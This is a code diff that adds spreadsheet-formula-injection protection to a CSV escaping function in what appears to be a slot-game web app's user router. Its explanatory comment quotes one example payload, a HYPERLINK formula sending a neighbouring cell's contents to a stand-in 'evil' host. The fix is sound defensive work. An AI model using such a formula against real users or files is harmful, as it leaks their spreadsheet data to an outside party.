@@ -129,9 +129,30 @@ router.get('/login-history', authenticate, async (req, res) => {
     }
 });
 
+/**
+ * Escape a value for a CSV cell.
+ *
+ * Two layers:
+ *
+ * 1. Spreadsheet-formula defuse. Excel / LibreOffice / Google Sheets
+ *    treat any cell starting with `=`, `+`, `-`, `@`, TAB, or CR as a
+ *    formula. A user-controlled string like
+ *    `=HYPERLINK("https://evil/?x="&A2,"Click")` lands here verbatim
+ *    via /api/slot/client-seed and ships in /api/user/slot-history.csv;
+ *    when the user shares that CSV with an accountant or support
+ *    agent and they open it in Excel, the formula exfiltrates sibling
+ *    cells. Prefixing a single quote forces the engine to render the
+ *    cell as text. The quote is stripped from the visible cell on
+ *    display but preserved in the raw bytes a script would read.
+ *
+ * 2. Standard quote-and-escape if the value contains `,` `"` `\n` or
+ *    `\r`. Done after step 1 so the leading single-quote (if any)
+ *    sits inside the quoted span.
+ */
 function csvEscape(v) {
     if (v == null) return '';
-    const s = String(v);
+    let s = String(v);
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
     if (/[",\n\r]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
     return s;
 }
